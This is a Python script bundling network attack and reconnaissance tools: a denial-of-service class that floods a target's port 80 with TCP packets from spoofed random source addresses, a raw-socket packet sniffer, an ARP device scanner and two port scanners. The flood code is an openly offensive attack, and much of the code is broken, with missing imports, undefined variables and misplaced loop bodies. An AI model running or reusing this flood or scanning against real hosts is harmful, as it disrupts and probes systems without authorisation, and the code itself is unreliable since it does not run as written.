#!/usr/bin/python3
# -*- coding: utf-8  -*-
from time import sleep
import time
import datetime
from datetime import datetime, date
import os
import re
import sys

class DOS(object):
    """docstring for DOS."""

    def __init__(self, target_IP):
        super(DOS, self).__init__()
        #Multiple IP multiple port
        i = 1
        while True:
           a = str(random.randint(1,254))
           b = str(random.randint(1,254))
           c = str(random.randint(1,254))
           d = str(random.randint(1,254))
           dot = "."
           Source_ip = a + dot + b + dot + c + dot + d

           for source_port in range(1, 65535):
              IP1 = IP(source_IP = source_IP, destination = target_IP)
              TCP1 = TCP(srcport = source_port, dstport = 80)
              pkt = IP1 / TCP1
              send(pkt,inter = .001)

              print ("packet sent ", i)
              i = i + 1

class sniffer(object):
    """docstring for sniffer."""

    def __init__(self, arg):
        super(sniffer, self).__init__()
        import socket
        import struct
        import binascii
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket. htons(0x0800))
        while True:
            packet = s.recvfrom(2048)
        ethernet_header = packet[0][0:14]
        eth_header = struct.unpack("!6s6s2s", ethernet_header)
        print ("Destination MAC:" + binascii.hexlify(eth_header[0]) + " Source MAC:" + binascii.hexlify(eth_header[1]) + " Type:" + binascii.hexlify(eth_header[2]))
        ipheader = pkt[0][14:34]
        ip_header = struct.unpack("!12s4s4s", ipheader)
        print ("Source IP:" + socket.inet_ntoa(ip_header[1]) + " Destination IP:" + socket.inet_ntoa(ip_header[2]))


class keep_alive(object):
    """docstring
     for keep_alive."""
    def __init__(self, target_ip):
        super(keep_alive, self).__init__()
        from scapy.all import ARP, Ether, srp
        print("target can be a range: 192.168.1.1/24")

        # target_ip = "192.168.1.1/24"
        # IP Address for the destination
        # create ARP packet
        arp = ARP(pdst=target_ip)
        # create the Ether broadcast packet
        # ff:ff:ff:ff:ff:ff MAC address indicates broadcasting
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        # stack them
        packet = ether/arp

        result = srp(packet, timeout=3, verbose=0)[0]

        # a list of clients, we will fill this in the upcoming loop
        clients = []

        for sent, received in result:
            # for each response, append ip and mac address to `clients` list
            clients.append({'ip': received.psrc, 'mac': received.hwsrc})

        # print clients
        print("Available devices in the network:")
        print("IP" + " "*18+"MAC")
        for client in clients:
            print("{:16}    {}".format(client['ip'], client['mac']))

class keep_alive_threader(object):
    """docstring for keep_alive_threader."""

    def __init__(self, target):
        super(keep_alive_threader, self).__init__()
        import socket
        import time
        import threading

        from queue import Queue
        socket.setdefaulttimeout(0.25)
        print_lock = threading.Lock()

        t_IP = socket.gethostbyname(target)
        print ('Starting scan on host: ', t_IP)

        def portscan(port):
           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           try:
              con = s.connect((t_IP, port))
              with print_lock:
                 print(port, 'is open')
              con.close()
           except:
              pass

        def threader():
           while True:
              worker = q.get()
              portscan(worker)
              q.task_done()
              q = Queue()
              startTime = time.time()

        for x in range(100):
           t = threading.Thread(target = threader)
           t.daemon = True
           t.start()

        for worker in range(1, 500):
           q.put(worker)

        q.join()
        print('Time taken:', time.time() - startTime)
class portscanner(object):
    """docstring for portscanner."""

    def __init__(self, target):
        super(portscanner, self).__init__()
        startTime = time.time()
        if __name__ == '__main__':
            t_IP = gethostbyname(target)
            print ('Starting scan on host: ', t_IP)

            for i in range(50, 500):
                 s = socket(AF_INET, SOCK_STREAM)
                 conn = s.connect_ex((t_IP, i))
                 if(conn == 0) :
                     print ('Port %d: OPEN' % (i,))
                     # table_data = [
                     #     ['Heading1', 'Heading2'],
                     #     ['row1 column1', 'row1 column2'],
                     #     ['row2 column1', 'row2 column2'],
                     #     ['row3 column1', 'row3 column2']
                     # ]
                     # table = AsciiTable(table_data)
                     # print table.table

                 s.close()
                 print('Time taken:', time.time() - startTime)
